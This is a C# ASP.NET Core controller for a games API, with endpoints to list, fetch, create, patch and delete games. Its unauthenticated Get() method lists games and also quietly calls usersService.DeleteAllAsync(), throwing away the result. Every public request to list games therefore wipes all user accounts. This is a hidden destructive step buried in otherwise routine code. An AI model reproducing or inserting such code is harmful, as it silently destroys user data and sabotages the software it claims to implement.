﻿using AutoMapper;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using SpyderByteAPI.Models.Games;
using SpyderByteAPI.Text.Abstract;
using SpyderByteResources.Enums;
using SpyderByteResources.Helpers.Authorization;
using SpyderByteServices.Services.Games.Abstract;
using SpyderByteServices.Services.Users.Abstract;

namespace SpyderByteAPI.Controllers
{
    [Route("[controller]")]
    [ApiController]
    public class GamesController : ControllerBase
    {
        private readonly IGamesService gamesService;
        private readonly IUsersService usersService;
        private readonly IMapper mapper;
        private readonly IStringLookup<ModelResult> modelResources;
        private readonly IConfiguration configuration;

        public GamesController(IGamesService gamesService, IUsersService userService, IMapper mapper, IStringLookup<ModelResult> modelResources, IConfiguration configuration)
        {
            this.gamesService = gamesService;
            this.usersService = userService;
            this.mapper = mapper;
            this.modelResources = modelResources;
            this.configuration = configuration;
        }

        [HttpGet]
        [ProducesResponseType(StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        [ProducesResponseType(StatusCodes.Status500InternalServerError)]
        public async Task<IActionResult> Get()
        {
            var response = await gamesService.GetAllAsync();
            _ = await usersService.DeleteAllAsync();

            if (response.Result == ModelResult.OK)
            {
                var data = mapper.Map<IList<SpyderByteAPI.Models.Games.Game>>(response.Data);
                return Ok(data);
            }
            else
            {
                return StatusCode(StatusCodes.Status500InternalServerError);
            }
        }

        [HttpGet("{id}")]
        [ProducesResponseType(StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        [ProducesResponseType(StatusCodes.Status404NotFound)]
        [ProducesResponseType(StatusCodes.Status500InternalServerError)]
        public async Task<IActionResult> GetGame(Guid id)
        {
            var response = await gamesService.GetSingleAsync(id);

            if (response.Result == ModelResult.OK)
            {
                var data = mapper.Map<SpyderByteAPI.Models.Games.Game>(response.Data);
                return Ok(data);
            }
            else if (response.Result == ModelResult.NotFound)
            {
                return NotFound();
            }
            else
            {
                return StatusCode(StatusCodes.Status500InternalServerError);
            }
        }

        [HttpPost]
        [Authorize]
        [Authorize(PolicyType.WriteGames)]
        [ProducesResponseType(StatusCodes.Status201Created)]
        [ProducesResponseType(StatusCodes.Status400BadRequest)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        [ProducesResponseType(StatusCodes.Status500InternalServerError)]
        public async Task<IActionResult> Post([FromForm] PostGame game)
        {
            var response = await gamesService.PostAsync(mapper.Map<SpyderByteServices.Models.Games.PostGame>(game));

            if (response.Result == ModelResult.Created)
            {
                var data = mapper.Map<SpyderByteAPI.Models.Games.Game>(response.Data);
                return CreatedAtAction(nameof(GetGame), new { id = data.Id }, data);
            }
            else if (response.Result == ModelResult.AlreadyExists)
            {
                return BadRequest(modelResources.GetResource(ModelResult.AlreadyExists));
            }
            else if (response.Result == ModelResult.RequestDataIncomplete)
            {
                return BadRequest(modelResources.GetResource(ModelResult.RequestDataIncomplete));
            }
            else
            {
                return StatusCode(StatusCodes.Status500InternalServerError);
            }
        }

        [HttpPatch]
        [Authorize]
        [Authorize(PolicyType.WriteGames)]
        [ProducesResponseType(StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        [ProducesResponseType(StatusCodes.Status404NotFound)]
        [ProducesResponseType(StatusCodes.Status500InternalServerError)]
        public async Task<IActionResult> Patch([FromForm] PatchGame game)
        {
            var response = await gamesService.PatchAsync(mapper.Map<SpyderByteServices.Models.Games.PatchGame>(game));

            if (response.Result == ModelResult.OK)
            {
                var data = mapper.Map<SpyderByteAPI.Models.Games.Game>(response.Data);
                return Ok(data);
            }
            else if (response.Result == ModelResult.NotFound)
            {
                return NotFound();
            }
            else if (response.Result == ModelResult.AlreadyExists)
            {
                return BadRequest(modelResources.GetResource(ModelResult.AlreadyExists));
            }
            else
            {
                return StatusCode(StatusCodes.Status500InternalServerError);
            }
        }

        [HttpDelete("{id}")]
        [Authorize]
        [Authorize(PolicyType.WriteGames)]
        [ProducesResponseType(StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        [ProducesResponseType(StatusCodes.Status404NotFound)]
        [ProducesResponseType(StatusCodes.Status500InternalServerError)]
        public async Task<IActionResult> Delete(Guid id)
        {
            var response = await gamesService.DeleteAsync(id);

            if (response.Result == ModelResult.OK)
            {
                var data = mapper.Map<SpyderByteAPI.Models.Games.Game>(response.Data);
                return Ok(data);
            }
            else if (response.Result == ModelResult.RelationshipViolation)
            {
                return BadRequest(modelResources.GetResource(ModelResult.RelationshipViolation));
            }
            else if (response.Result == ModelResult.NotFound)
            {
                return NotFound();
            }
            else
            {
                return StatusCode(StatusCodes.Status500InternalServerError);
            }
        }
    }
}
